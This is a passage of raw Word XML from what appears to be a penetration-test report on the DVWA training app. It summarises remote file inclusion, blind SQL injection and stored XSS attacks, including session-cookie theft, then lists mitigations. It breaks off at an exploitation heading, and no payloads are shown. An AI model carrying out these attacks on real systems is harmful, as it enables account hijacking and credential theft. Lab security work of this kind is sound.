      <w:r w:rsidR="00D7632C" w:rsidRPr="00D7632C">
        <w:t>by performi</w:t>
      </w:r>
      <w:r w:rsidR="00D7632C">
        <w:t xml:space="preserve">ng </w:t>
      </w:r>
      <w:bookmarkEnd w:id="3"/>
      <w:r w:rsidR="00D7632C">
        <w:t>a remote file inclusion attack against the DVWA web app found at</w:t>
      </w:r>
      <w:r w:rsidR="001D4594">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001D4594" w:rsidRPr="007E4921">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>10.0.2.5/dvwa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00D7632C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">The application permits the inclusion of files from other servers allowing for the web application to being tricked into running a malicious script used </w:t>
      </w:r>
      <w:r w:rsidR="0030716C">
        <w:t>to</w:t>
      </w:r>
      <w:r w:rsidR="00A851A9">
        <w:t xml:space="preserve"> gain access to the system</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09647660" w14:textId="77777777" w:rsidR="00B23753" w:rsidRDefault="00B23753" w:rsidP="00976644">
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="551C6792" w14:textId="2690C771" w:rsidR="00FC60A7" w:rsidRDefault="00FC60A7" w:rsidP="00FC60A7">
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="00630312">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">Target: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>DVWA</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> –  </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:t xml:space="preserve">Blind </w:t>
      </w:r>
      <w:r>
        <w:t>SQL Injection Vulnerability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DBE2DE5" w14:textId="2D4AD22A" w:rsidR="00FC60A7" w:rsidRPr="00A952F2" w:rsidRDefault="00FC60A7" w:rsidP="00FC60A7">
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Gained access to users and passwords database by performing a manual </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:t xml:space="preserve">Blind </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">SQL Injection attack against the DVWA web application </w:t>
      </w:r>
      <w:bookmarkStart w:id="4" w:name="_Hlk67398102"/>
      <w:r>
        <w:t xml:space="preserve">found on </w:t>
      </w:r>
      <w:r w:rsidRPr="007E4921">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>10.0.2.5/dvwa</w:t>
      </w:r>
      <w:bookmarkEnd w:id="4"/>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:bookmarkStart w:id="5" w:name="_Hlk67056364"/>
      <w:r w:rsidRPr="00976644">
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:bookmarkEnd w:id="5"/>
    </w:p>
    <w:p w14:paraId="5BFB5C9A" w14:textId="77777777" w:rsidR="00FC60A7" w:rsidRDefault="00FC60A7" w:rsidP="00976644">
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="337C37B3" w14:textId="025E4613" w:rsidR="00A851A9" w:rsidRDefault="00A851A9" w:rsidP="00A851A9">
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="00630312">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">Target: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>DVWA</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidR="0030716C">
        <w:t xml:space="preserve">Stored </w:t>
      </w:r>
      <w:r>
        <w:t>Cross Scripting Vulnerability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F7197FB" w14:textId="2F11AAF6" w:rsidR="00A851A9" w:rsidRDefault="0030716C" w:rsidP="00A851A9">
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>Leveraged vulnerability found in DVWA XSS tab by storing a malicious JavaScript file on the target server</w:t>
      </w:r>
      <w:r w:rsidR="00AC0701">
        <w:t xml:space="preserve"> to achieve disclosure of user’s session cookies, leading to a session hijack and control over the account</w:t>
      </w:r>
      <w:r w:rsidR="00A851A9">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53D8699F" w14:textId="77777777" w:rsidR="00D517AF" w:rsidRDefault="00D517AF" w:rsidP="00A851A9">
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2008F920" w14:textId="77777777" w:rsidR="00D517AF" w:rsidRDefault="00D517AF" w:rsidP="00A851A9">
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3317CF66" w14:textId="77777777" w:rsidR="00A851A9" w:rsidRDefault="00A851A9" w:rsidP="00976644">
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17F162BE" w14:textId="77777777" w:rsidR="00976644" w:rsidRDefault="00976644" w:rsidP="00AD5018">
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28D1A580" w14:textId="0DC6E6C3" w:rsidR="00153167" w:rsidRDefault="00153167" w:rsidP="00AD5018">
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="334CC024" w14:textId="77777777" w:rsidR="00153167" w:rsidRPr="009D14E4" w:rsidRDefault="00153167" w:rsidP="00AD5018">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D14E4">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve">RECOMMENDATIONS </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ABDDDD4" w14:textId="400FE43B" w:rsidR="00153167" w:rsidRDefault="00153167" w:rsidP="00153167">
      <w:r>
        <w:t xml:space="preserve">To increase </w:t>
      </w:r>
      <w:r w:rsidR="00F07EF3">
        <w:t xml:space="preserve">security posture and prevent </w:t>
      </w:r>
      <w:r w:rsidR="00AC0701">
        <w:t>the attacks mentioned on the previous page</w:t>
      </w:r>
      <w:r>
        <w:t>, Adelaja recommends the following mitigations and/or remediations be performed:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="414CC12D" w14:textId="1463DEE6" w:rsidR="00CA57FA" w:rsidRPr="00CA57FA" w:rsidRDefault="00AC0701" w:rsidP="00CA57FA">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>Limit API Inclusion</w:t>
      </w:r>
      <w:r w:rsidR="00153167" w:rsidRPr="00153167">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00153167">
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>Ensures potential attacks cannot perform directory traversal. Allowing inclusion only from a directory and directories below it</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="252862AF" w14:textId="3D293CE5" w:rsidR="00F07EF3" w:rsidRDefault="00AC0701" w:rsidP="00153167">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>Accept Only Characters And Numbers For File Names</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>. Blacklisting every special character</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00C47165">
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t xml:space="preserve"> not in use in a filename.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70E258CF" w14:textId="0C312848" w:rsidR="00CA57FA" w:rsidRDefault="00C47165" w:rsidP="00153167">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Parameterized Statements.</w:t>
      </w:r>
      <w:r w:rsidR="00CA57FA">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Switching to a safe API is most likely the safest way to handle SQL Injections</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61376C13" w14:textId="7211F1C8" w:rsidR="00153167" w:rsidRPr="00EA0FE0" w:rsidRDefault="00C47165" w:rsidP="00153167">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>Character Escaping</w:t>
      </w:r>
      <w:r w:rsidR="00EA0FE0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>Without an API, Web Applications should be able to escape special characters. Although it should be considered a last line of defense as escaping characters is not 100% foolproof.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54910482" w14:textId="43A3A673" w:rsidR="00CA57FA" w:rsidRDefault="00C47165" w:rsidP="00CA57FA">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>HTML and Attribute Encode</w:t>
      </w:r>
      <w:r w:rsidR="00F07EF3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>Before inserting untrusted data into typical HTML values. It should not be used for event handlers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1511AEE8" w14:textId="7E99F7BA" w:rsidR="009E3B7D" w:rsidRPr="00C47165" w:rsidRDefault="00C47165" w:rsidP="009E3B7D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t xml:space="preserve">Sanitize HTML Markup. </w:t>
      </w:r>
      <w:r w:rsidRPr="00C47165">
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>Encoding and validating untrusted input that is supposed to hold HTML can be very difficult. A library that can parse and clean HTML formatted text is crucial.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B1D1742" w14:textId="200D7413" w:rsidR="00CA57FA" w:rsidRDefault="00CA57FA" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62CC0D29" w14:textId="77777777" w:rsidR="00C47165" w:rsidRDefault="00C47165" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3163CD00" w14:textId="77777777" w:rsidR="00C47165" w:rsidRDefault="00C47165" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CAF3737" w14:textId="77777777" w:rsidR="00C47165" w:rsidRDefault="00C47165" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A19FA3E" w14:textId="77777777" w:rsidR="00C47165" w:rsidRDefault="00C47165" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C38EDAE" w14:textId="77777777" w:rsidR="00C47165" w:rsidRDefault="00C47165" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="16AC3D31" w14:textId="77777777" w:rsidR="00C47165" w:rsidRDefault="00C47165" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63C4FF48" w14:textId="77777777" w:rsidR="00C47165" w:rsidRDefault="00C47165" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46E38E8E" w14:textId="77777777" w:rsidR="00FF06BD" w:rsidRDefault="00FF06BD" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21D8630C" w14:textId="77777777" w:rsidR="00FF06BD" w:rsidRDefault="00FF06BD" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F4E1CDC" w14:textId="22E0B6FA" w:rsidR="002752F8" w:rsidRPr="009D14E4" w:rsidRDefault="002752F8" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="0070C0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D14E4">
        <w:rPr>
          <w:iCs/>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t>SEVERITY SCALE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EA6B9CC" w14:textId="77777777" w:rsidR="002752F8" w:rsidRPr="002752F8" w:rsidRDefault="002752F8" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5180DDB9" w14:textId="2D6FDB2D" w:rsidR="002752F8" w:rsidRDefault="002752F8" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002752F8">
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="37381AF9" wp14:editId="0B38C6B7">
            <wp:extent cx="6659880" cy="3429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95541" cy="3447361"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="23B5A8FB" w14:textId="2D327771" w:rsidR="00CA57FA" w:rsidRDefault="00CA57FA" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="041CE39A" w14:textId="63542B3D" w:rsidR="002752F8" w:rsidRDefault="002752F8" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F0BA804" w14:textId="6D3967A9" w:rsidR="002752F8" w:rsidRDefault="002752F8" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E4A9FCD" w14:textId="1FE15A69" w:rsidR="002752F8" w:rsidRDefault="002752F8" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="235626F1" w14:textId="3B20B941" w:rsidR="002752F8" w:rsidRDefault="002752F8" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13558A99" w14:textId="77777777" w:rsidR="000F1E11" w:rsidRDefault="000F1E11" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C060738" w14:textId="77777777" w:rsidR="000F1E11" w:rsidRDefault="000F1E11" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3181F450" w14:textId="77777777" w:rsidR="000F1E11" w:rsidRDefault="000F1E11" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F17623C" w14:textId="77777777" w:rsidR="000F1E11" w:rsidRDefault="000F1E11" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5DB98919" w14:textId="77777777" w:rsidR="000F1E11" w:rsidRDefault="000F1E11" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F201254" w14:textId="77777777" w:rsidR="000F1E11" w:rsidRDefault="000F1E11" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55172ABD" w14:textId="77777777" w:rsidR="000F1E11" w:rsidRDefault="000F1E11" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56A660F6" w14:textId="77777777" w:rsidR="000F1E11" w:rsidRDefault="000F1E11" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CF78518" w14:textId="77777777" w:rsidR="000F1E11" w:rsidRDefault="000F1E11" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59A6BE91" w14:textId="77777777" w:rsidR="000F1E11" w:rsidRDefault="000F1E11" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58E50B1B" w14:textId="77777777" w:rsidR="000F1E11" w:rsidRDefault="000F1E11" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F7760BC" w14:textId="77777777" w:rsidR="000F1E11" w:rsidRDefault="000F1E11" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71029D3D" w14:textId="77777777" w:rsidR="000F1E11" w:rsidRDefault="000F1E11" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02D3CFD1" w14:textId="77777777" w:rsidR="000F1E11" w:rsidRDefault="000F1E11" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E6E1CC6" w14:textId="77777777" w:rsidR="000F1E11" w:rsidRDefault="000F1E11" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4716E251" w14:textId="77777777" w:rsidR="000F1E11" w:rsidRDefault="000F1E11" w:rsidP="00CA57FA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="716FB3F3" w14:textId="27C6BFD5" w:rsidR="002752F8" w:rsidRPr="00ED0E81" w:rsidRDefault="00420339" w:rsidP="000F1E11">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>EXPLOITATION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBA27FF" w14:textId="77777777" w:rsidR="000F1E11" w:rsidRPr="00ED0E81" w:rsidRDefault="000F1E11" w:rsidP="000F1E11">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3711250A" w14:textId="5C439B1D" w:rsidR="000F1E11" w:rsidRPr="00ED0E81" w:rsidRDefault="000F1E11" w:rsidP="000F1E11">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:iCs/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="6" w:name="_Hlk67419206"/>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:iCs/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Local File Inclusion Vulnerability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23625416" w14:textId="7059D965" w:rsidR="004D11C1" w:rsidRPr="00FF06BD" w:rsidRDefault="00420339" w:rsidP="00FF06BD">
